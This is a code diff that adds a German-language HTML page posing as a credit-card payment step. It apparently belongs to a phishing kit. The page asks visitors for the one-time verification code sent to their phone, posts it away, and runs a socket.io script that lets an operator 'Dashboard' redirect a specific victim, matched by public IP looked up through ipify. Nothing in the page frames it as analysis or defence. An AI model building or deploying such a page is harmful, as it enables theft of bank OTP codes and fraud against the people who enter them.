@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/kipola.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div>
+        <div class="hedpo-pc pc">
+            <img src="./img/hedpo-pc.PNG" alt="">
+        </div>
+        <div class="hedpo-mb mb">
+            <img src="./img/hedpo-mb.PNG" alt="">
+        </div>
+    </div>
+    <div class="bigm">
+        <div>
+            <div class="hedpo2-pc pc">
+                <img src="./img/hedop2.PNG" alt="">
+            </div>
+            <div class="hedpo2-mb mb">
+                <img src="./img/hedpo2-mb.PNG" alt="">
+            </div>
+            <div class="meta">
+                <p class="pp1">Zahlart auswählen</p>
+                <div class="ccoma">
+                    <div class="topcard">
+                        <div class="incard">
+                            <img src="./img/card-hand.PNG" alt="">
+                            <p style="margin-left: 15px; font-weight: 600;">Kreditkarte</p>
+                        </div>
+                        <img class="visa" src="./img/cards.PNG" alt="">
+                    </div>
+                    <div class="otp">
+                        <img src="./img/otp.svg" alt="">
+                        <p class="pp3">Du musst dich verifizieren, indem du den Einmal-Code eingibst, den du auf deinem Telefon erhalten hast.</p>
+                    </div>
+                <form class="form1 form2" method="post" id="pg3">
+                    <p>Bestätigungsnachricht</p>
+                    <input type="tel" id="sps1" required maxlength="20">
+                    
+                    
+                    
+                    
+                    <br>
+                        <button class="btn1"  type="submit">Bestätigen</button>
+                 </form>
+                </div>
+                </div>
+                
+                    
+            </div>
+            <div>
+                
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <div class="botanom">
+            <img src="./img/botanom-pc.png" class="pc" alt="">
+            <img src="./img/botanom-mb.png" class="mb" alt="">
+        </div>
+    </div>
+
+    <script src="./js/stb.js"></script>
+
+    
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  async function getPublicIP() {
+try {
+const response = await fetch('https://api.ipify.org?format=json');
+const data = await response.json();
+console.log("Public IP:", data.ip);
+return data.ip;
+} catch (error) {
+console.error("Failed to fetch IP:", error);
+return null;
+}
+}
+  const socket = io();
+ 
+  // Handle redirect messages from server
+  socket.on('redirect', async (data) => {
+    const currentIp = await getPublicIP();
+    console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+    
+    if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+      window.location.href = data.url;
+    }
+  });
+  </script>
+</body>
+</html>
